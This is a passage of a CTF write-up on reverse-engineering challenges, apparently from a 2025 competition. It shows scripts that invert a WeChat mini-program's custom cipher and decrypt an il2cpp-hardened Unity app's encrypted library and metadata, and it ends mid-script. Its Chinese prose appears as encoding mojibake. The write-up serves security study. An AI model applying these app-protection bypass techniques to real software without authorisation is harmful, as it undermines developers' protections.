</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>text</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>cmp</span> <span class=o>=</span> <span class=p>[</span><span class=mi>238</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>196</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>52</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>232</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>252</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>153</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>94</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>170</span><span class=p>,</span> <span class=mi>54</span><span class=p>,</span> <span class=mi>222</span><span class=p>,</span> <span class=mi>247</span><span class=p>,</span> <span class=mi>136</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>125</span><span class=p>,</span> <span class=mi>161</span><span class=p>,</span> <span class=mi>247</span><span class=p>,</span> <span class=mi>67</span><span class=p>,</span> <span class=mi>34</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># for i in range(30):</span>
</span></span><span class=line><span class=cl><span class=c1>#     print(chr(cmp[i]^108^text[i]), end=&#34;&#34;)</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°flag{r0uNd_Rc4_Aff1neEnc1yp0!}</p><h1 id=mobile>Mobile</h1><h2 id=ezminiapp>EzMiniApp</h2><p>wxapkg.exeè§£åŒ…å°ç¨‹åºï¼Œå‘ç°é€»è¾‘åœ¨app-service.js</p><p>åŠ å¯†é€»è¾‘æ˜¯ä¸€ä¸ªæ—‹è½¬æ··æ·†ï¼Œé€»è¾‘å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=nx>enigmaticTransformation</span><span class=o>:</span> <span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>t</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>e</span><span class=p>,</span> <span class=nx>n</span><span class=p>,</span> <span class=nx>r</span> <span class=o>=</span> <span class=p>[],</span> 
</span></span><span class=line><span class=cl>             <span class=nx>i</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=nx>t</span><span class=p>).</span><span class=nx>map</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span> <span class=k>return</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=p>}),</span>
</span></span><span class=line><span class=cl>             <span class=nx>s</span> <span class=o>=</span> <span class=nx>i</span><span class=p>.</span><span class=nx>length</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=nx>c</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                   <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>e</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>e</span> <span class=o>&lt;</span> <span class=nx>a</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>e</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                       <span class=k>switch</span><span class=p>(</span><span class=nx>e</span> <span class=o>%</span> <span class=mi>4</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=mi>1</span> <span class=o>*</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>];</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span> <span class=o>+</span> <span class=mi>0</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=mi>0</span> <span class=o>|</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>];</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                           <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=nx>t</span> <span class=o>+=</span> <span class=mi>0</span> <span class=o>^</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                       <span class=p>}</span>
</span></span><span class=line><span class=cl>                   <span class=k>return</span> <span class=nx>t</span>
</span></span><span class=line><span class=cl>               <span class=p>}(</span><span class=nx>i</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>             <span class=nx>o</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>o</span> <span class=o>&lt;</span> <span class=nx>a</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>o</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>u</span> <span class=o>=</span> <span class=k>void</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nx>o</span> <span class=o>%</span> <span class=mi>3</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>u</span> <span class=o>=</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>o</span><span class=p>)</span> <span class=o>^</span> <span class=nx>i</span><span class=p>[</span><span class=nx>o</span> <span class=o>%</span> <span class=nx>s</span><span class=p>];</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>u</span> <span class=o>=</span> <span class=nx>i</span><span class=p>[</span><span class=nx>o</span> <span class=o>%</span> <span class=nx>s</span><span class=p>]</span> <span class=o>^</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>o</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=nx>e</span> <span class=o>=</span> <span class=nx>a</span><span class=p>.</span><span class=nx>charCodeAt</span><span class=p>(</span><span class=nx>o</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                    <span class=nx>n</span> <span class=o>=</span> <span class=nx>i</span><span class=p>[</span><span class=nx>o</span> <span class=o>%</span> <span class=nx>s</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                    <span class=nx>u</span> <span class=o>=</span> <span class=nx>e</span> <span class=o>^</span> <span class=nx>n</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>h</span> <span class=o>=</span> <span class=k>void</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nx>c</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=nx>u</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>6</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span> <span class=o>&amp;</span> <span class=mi>7</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>4</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>4</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span> <span class=o>&amp;</span> <span class=mi>15</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>5</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>5</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>3</span> <span class=o>&amp;</span> <span class=mi>31</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>6</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>6</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span> <span class=o>&amp;</span> <span class=mi>63</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>7</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=mi>7</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span> <span class=o>&amp;</span> <span class=mi>127</span><span class=p>);</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>default</span><span class=o>:</span> <span class=nx>h</span> <span class=o>=</span> <span class=mi>255</span> <span class=o>&amp;</span> <span class=p>(</span><span class=nx>u</span> <span class=o>&lt;&lt;</span> <span class=nx>c</span> <span class=o>|</span> <span class=nx>u</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=nx>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>switch</span><span class=p>(</span><span class=nx>o</span> <span class=o>%</span> <span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>0</span><span class=o>:</span> <span class=nx>r</span><span class=p>[</span><span class=nx>r</span><span class=p>.</span><span class=nx>length</span><span class=p>]</span> <span class=o>=</span> <span class=nx>h</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>r</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kd>function</span><span class=p>(</span><span class=nx>a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=p>[],</span> <span class=nx>e</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>e</span> <span class=o>&lt;</span> <span class=nx>a</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>e</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>switch</span><span class=p>(</span><span class=nx>e</span> <span class=o>%</span> <span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=mi>0</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                    <span class=nx>t</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span> <span class=o>=</span> <span class=nx>a</span><span class=p>[</span><span class=nx>e</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>t</span>
</span></span><span class=line><span class=cl>    <span class=p>}(</span><span class=nx>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åä¸»å‡½æ•°çš„éªŒè¯é€»è¾‘æ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>a</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>inputValue</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=s2>&#34;&#34;</span> <span class=o>!==</span> <span class=nx>a</span><span class=p>.</span><span class=nx>trim</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=k>this</span><span class=p>.</span><span class=nx>customEncrypt</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=s2>&#34;newKey2025!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>t</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>t</span><span class=p>)</span> <span class=o>===</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>([</span><span class=mi>1</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>194</span><span class=p>,</span><span class=mi>133</span><span class=p>,</span><span class=mi>195</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>232</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>163</span><span class=p>,</span><span class=mi>131</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>171</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>106</span><span class=p>,</span><span class=mi>225</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>65</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=o>?</span> <span class=nx>wx</span><span class=p>.</span><span class=nx>showToast</span><span class=p>({</span> <span class=nx>title</span><span class=o>:</span> <span class=s2>&#34;Right&#34;</span><span class=p>,</span> <span class=nx>icon</span><span class=o>:</span> <span class=s2>&#34;success&#34;</span><span class=p>,</span> <span class=nx>duration</span><span class=o>:</span> <span class=mf>2e3</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=nx>wx</span><span class=p>.</span><span class=nx>showToast</span><span class=p>({</span> <span class=nx>title</span><span class=o>:</span> <span class=s2>&#34;Wrong&#34;</span><span class=p>,</span> <span class=nx>icon</span><span class=o>:</span> <span class=s2>&#34;error&#34;</span><span class=p>,</span> <span class=nx>duration</span><span class=o>:</span> <span class=mf>2e3</span> <span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>wx</span><span class=p>.</span><span class=nx>showToast</span><span class=p>({</span> <span class=nx>title</span><span class=o>:</span> <span class=s2>&#34;è¯·è¾“å…¥å†…å®¹&#34;</span><span class=p>,</span> <span class=nx>icon</span><span class=o>:</span> <span class=s2>&#34;none&#34;</span><span class=p>,</span> <span class=nx>duration</span><span class=o>:</span> <span class=mf>2e3</span> <span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ç›´æ¥æ±‚é€†å³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl> <span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>key_bytes</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>key</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>key_bytes</span><span class=p>)</span> <span class=o>%</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>out_bytes</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>cb</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>cipher</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>c</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>u</span> <span class=o>=</span> <span class=n>cb</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>u</span> <span class=o>=</span> <span class=p>((</span><span class=n>cb</span> <span class=o>&gt;&gt;</span> <span class=n>c</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=n>cb</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>-</span> <span class=n>c</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>kb</span> <span class=o>=</span> <span class=n>key_bytes</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=n>s</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>u</span> <span class=o>^</span> <span class=n>kb</span>
</span></span><span class=line><span class=cl>        <span class=n>out_bytes</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>out_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>b</span><span class=p>,</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>194</span><span class=p>,</span><span class=mi>133</span><span class=p>,</span><span class=mi>195</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>232</span><span class=p>,</span><span class=mi>104</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>163</span><span class=p>,</span><span class=mi>131</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>171</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>106</span><span class=p>,</span><span class=mi>225</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>65</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;newKey2025!&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>raw</span><span class=p>,</span> <span class=n>text</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°flagï¼šflag{JustEasyMiniProgram}</p><h2 id=just>Just</h2><p>il2cppçš„åŠ å›ºï¼Œæ€è€ƒå¦‚ä½•è§£å¯†il2cpp.so</p><p><img src=/img/2025-QWNT/28.png alt=img></p><p>UnityPlayerActivityä¸­è½½å…¥äº†just.soï¼Œåç»­ä¸å†æœ‰ä»»ä½•JNIè°ƒç”¨ï¼Œè¯´æ˜åˆ©ç”¨äº†æ„é€ å‡½æ•°æˆ–è€…Jni_onload</p><p>Just.so Hookäº†dlopenè§£å¯†il2cpp.so</p><p><img src=/img/2025-QWNT/29.png alt=img></p><p>å¯ä»¥çœ‹åˆ°è§£å¯†é€»è¾‘æ˜¯RC4+^0x33</p><p>å¯†é’¥åœ¨ä¸Šæ–‡ä¸­æ˜¯nihaounity</p><p><img src=/img/2025-QWNT/30.png alt=img></p><p>è§£å¯†åˆ°soæ–‡ä»¶ï¼Œç›´æ¥å°è¯•il2cppdumperæ˜¯å¤±è´¥çš„ï¼Œå‘ç°metadataä¹Ÿè¢«åŠ å¯†äº†ï¼Œmetadataæ˜¯åœ¨il2cpp.soä¸­è¿›è¡ŒåŠ å¯†çš„</p><p><img src=/img/2025-QWNT/31.png alt=img></p><p>çœ‹åˆ°åŠ å¯†é€»è¾‘ï¼Œè¿™é‡Œç›´æ¥è§£å¯†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span><span class=o>,</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>inp</span><span class=p>,</span> <span class=n>outp</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>inp</span><span class=p>)</span><span class=o>.</span><span class=n>read_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>kl</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=mi>1024</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xffff</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=p>[</span><span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=mi>1028</span> <span class=o>+</span> <span class=mi>4</span><span class=o>*</span><span class=n>i</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>kl</span><span class=p>)]</span>
